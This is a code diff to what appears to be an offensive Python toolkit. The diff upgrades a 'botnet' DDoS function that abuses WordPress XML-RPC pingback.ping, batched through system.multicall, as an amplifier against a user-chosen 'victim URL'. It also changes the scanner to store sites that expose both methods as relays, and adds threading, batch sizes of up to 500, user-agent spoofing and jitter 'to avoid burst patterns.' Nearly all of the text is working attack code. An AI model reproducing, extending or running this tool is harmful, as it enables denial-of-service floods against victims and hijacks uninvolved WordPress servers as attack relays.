@@ -4565,11 +4565,15 @@ def _cms_scan_single(url, batch_mode=False):
                 if high:
                     print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")
 
-                # ── Save to botnet DB only if DDoS vector found (not brute-force) ──
+                # ── Save to botnet DB only if BOTH amplification vectors found ──
                 ddos_vecs = []
-                if "pingback.ping" in xmlrpc_methods:
+                has_pingback = "pingback.ping" in xmlrpc_methods
+                has_multicall = "system.multicall" in xmlrpc_methods
+                if has_pingback:
                     ddos_vecs.append("pingback.ping")
-                if ddos_vecs:
+                if has_multicall:
+                    ddos_vecs.append("system.multicall")
+                if has_pingback and has_multicall:
                     # Check if already in DB before adding
                     existing = _botnet_db_load()
                     already_exists = any(z["url"] == url for z in existing)
@@ -7906,15 +7910,16 @@ def botnet_manager():
 
 
 def _botnet_xmlrpc_amplify(relays):
-    """Use WordPress sites with pingback.ping as amplifiers against a victim URL."""
+    """Use WordPress sites with pingback.ping + system.multicall as amplifiers against a victim URL."""
     print(f"\n  {R}{'═' * 60}{RST}")
-    print(f"  {R}  XML-RPC PINGBACK AMPLIFICATION{RST}")
+    print(f"  {R}  XML-RPC MULTICALL PINGBACK AMPLIFICATION{RST}")
     print(f"  {R}{'═' * 60}{RST}")
-    print(f"  {W}Each WordPress relay will send HTTP requests to the victim{RST}")
-    print(f"  {W}URL via pingback.ping — the WP sites act as amplifiers.{RST}")
+    print(f"  {W}Each relay batches multiple pingback.ping calls inside a{RST}")
+    print(f"  {W}single system.multicall request — massive amplification.{RST}")
     print(f"  {C}Available relays:{RST} {G}{len(relays)}{RST}")
     for r in relays:
-        print(f"    {R}►{RST} {r['url']}")
+        vecs = ", ".join(r.get("vectors", []))
+        print(f"    {R}►{RST} {r['url']}  [{vecs}]")
     print(f"  {R}{'═' * 60}{RST}")
 
     victim = prompt("Victim URL (the target to DDoS)")
@@ -7924,19 +7929,23 @@ def _botnet_xmlrpc_amplify(relays):
         victim = "https://" + victim
 
     threads_per = input(f"  {Y}Threads per relay (1-50) [10]:{RST} ").strip() or "10"
+    batch_size = input(f"  {Y}Pings per multicall batch (1-500) [50]:{RST} ").strip() or "50"
     duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
 
     try:
         threads_per = min(50, max(1, int(threads_per)))
+        batch_size = min(500, max(1, int(batch_size)))
         duration = min(300, max(1, int(duration)))
     except ValueError:
         print_err("Invalid numbers")
         return
 
-    print(f"\n  {R}  VICTIM:  {W}{victim}{RST}")
-    print(f"  {R}  RELAYS:  {W}{len(relays)}{RST}")
-    print(f"  {R}  THREADS: {W}{threads_per}/relay = {threads_per * len(relays)} total{RST}")
-    print(f"  {R}  DURATION:{W} {duration}s{RST}")
+    print(f"\n  {R}  VICTIM:   {W}{victim}{RST}")
+    print(f"  {R}  RELAYS:   {W}{len(relays)}{RST}")
+    print(f"  {R}  THREADS:  {W}{threads_per}/relay = {threads_per * len(relays)} total{RST}")
+    print(f"  {R}  BATCH:    {W}{batch_size} pingbacks per multicall request{RST}")
+    print(f"  {R}  DURATION: {W}{duration}s{RST}")
+    print(f"  {R}  MULTIPLIER: {W}1 HTTP req = {batch_size} pingbacks to victim{RST}")
 
     confirm = input(f"\n  {R}Confirm launch? (yes/no):{RST} ").strip().lower()
     if confirm not in ("yes", "y", "si", "s"):
@@ -7944,35 +7953,55 @@ def _botnet_xmlrpc_amplify(relays):
         return
 
     stop_event = threading.Event()
+    # counters track actual pingbacks (batch_size per successful request)
     counters = {r["url"]: [0] for r in relays}
+    http_reqs = {r["url"]: [0] for r in relays}
     errors = [0]
     start_time = time.time()
 
-    def pingback_worker(relay_url, counter):
+    def _build_multicall_payload(relay_url, n):
+        """Build a system.multicall XML payload with n pingback.ping calls."""
+        calls = []
+        for _ in range(n):
+            post_id = random.randint(1, 9999)
+            calls.append(
+                '<value><struct>'
+                '<member><name>methodName</name><value><string>pingback.ping</string></value></member>'
+                '<member><name>params</name><value><array><data>'
+                f'<value><string>{victim}</string></value>'
+                f'<value><string>{relay_url}/?p={post_id}</string></value>'
+                '</data></array></value></member>'
+                '</struct></value>'
+            )
+        return (
+            '<?xml version="1.0"?>'
+            '<methodCall><methodName>system.multicall</methodName>'
+            '<params><param><value><array><data>'
+            + ''.join(calls)
+            + '</data></array></value></param></params></methodCall>'
+        )
+
+    def pingback_worker(relay_url, counter, req_counter):
         xmlrpc_url = relay_url.rstrip("/") + "/xmlrpc.php"
         sess = requests.Session()
         while not stop_event.is_set():
             try:
-                # Randomize the post ID to generate unique pingback requests
-                post_id = random.randint(1, 9999)
-                payload = (
-                    '<?xml version="1.0"?>'
-                    '<methodCall><methodName>pingback.ping</methodName><params>'
-                    f'<param><value><string>{victim}</string></value></param>'
-                    f'<param><value><string>{relay_url}/?p={post_id}</string></value></param>'
-                    '</params></methodCall>'
-                )
-                sess.post(
+                payload = _build_multicall_payload(relay_url, batch_size)
+                resp = sess.post(
                     xmlrpc_url,
                     data=payload,
                     headers={
                         "Content-Type": "text/xml",
                         "User-Agent": f"WordPress/{random.randint(5,6)}.{random.randint(0,9)}",
                     },
-                    timeout=8,
+                    timeout=15,
                     verify=False,
                 )
-                counter[0] += 1
+                if resp.status_code == 200 and "methodResponse" in resp.text:
+                    counter[0] += batch_size
+                    req_counter[0] += 1
+                else:
+                    errors[0] += 1
             except Exception:
                 errors[0] += 1
             # Small jitter to avoid burst patterns
@@ -7984,14 +8013,17 @@ def _botnet_xmlrpc_amplify(relays):
             if elapsed > 0:
                 parts = []
                 total = 0
+                total_reqs = 0
                 for u, cnt in counters.items():
                     domain = urlparse(u).netloc
                     parts.append(f"{domain}:{cnt[0]}")
                     total += cnt[0]
+                    total_reqs += http_reqs[u][0]
                 rps = total / elapsed
                 sys.stdout.write(
                     f"\r  {Y}[AMPLIFY]{RST} Pingbacks: {G}{total}{RST}  "
-                    f"Rate: {C}{rps:.0f}/s{RST}  "
+                    f"HTTP reqs: {W}{total_reqs}{RST}  "
+                    f"Rate: {C}{rps:.0f} pings/s{RST}  "
                     f"Errors: {R}{errors[0]}{RST}  "
                     f"Relays: {' | '.join(parts)}    "
                 )
@@ -8005,7 +8037,8 @@ def _botnet_xmlrpc_amplify(relays):
     workers = []
     for r in relays:
         for _ in range(threads_per):
-            w = threading.Thread(target=pingback_worker, args=(r["url"], counters[r["url"]]))
+            w = threading.Thread(target=pingback_worker,
+                                 args=(r["url"], counters[r["url"]], http_reqs[r["url"]]))
             w.daemon = True
             w.start()
             workers.append(w)
@@ -8020,21 +8053,26 @@ def _botnet_xmlrpc_amplify(relays):
 
     elapsed = time.time() - start_time
     total_pings = sum(c[0] for c in counters.values())
+    total_reqs = sum(c[0] for c in http_reqs.values())
     print(f"\n\n  {Y}{'═' * 60}{RST}")
-    print(f"  {Y}  AMPLIFICATION RESULTS{RST}")
+    print(f"  {Y}  MULTICALL AMPLIFICATION RESULTS{RST}")
     print(f"  {Y}{'═' * 60}{RST}")
     print_row("Victim", victim)
+    print_row("Batch Size", f"{batch_size} pings/multicall")
     for r in relays:
         cnt = counters[r["url"]][0]
+        reqs = http_reqs[r["url"]][0]
         domain = urlparse(r["url"]).netloc
-        print(f"  {C}{domain:<35}{RST} {W}{cnt} pingbacks sent{RST}")
+        print(f"  {C}{domain:<35}{RST} {W}{cnt} pingbacks ({reqs} HTTP reqs){RST}")
     print(f"  {Y}{'─' * 60}{RST}")
     print_row("Total Pingbacks", str(total_pings))
+    print_row("Total HTTP Reqs", str(total_reqs))
+    print_row("Amplification", f"{batch_size}x per request")
     print_row("Errors", str(errors[0]))
     print_row("Duration", f"{elapsed:.1f}s")
     print_row("Avg Rate", f"{total_pings / elapsed:.0f} pingbacks/s" if elapsed > 0 else "N/A")
-    print(f"\n  {W}Each pingback triggers the relay WP site to fetch the victim URL.{RST}")
-    print(f"  {W}Effective amplification: {G}~{total_pings}x{RST} {W}HTTP requests to victim.{RST}")
+    print(f"\n  {W}Each multicall bundles {G}{batch_size}{RST} {W}pingback.ping calls in 1 HTTP request.{RST}")
+    print(f"  {W}Effective amplification: {G}~{total_pings}x{RST} {W}HTTP requests to victim from {total_reqs} actual requests sent.{RST}")
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
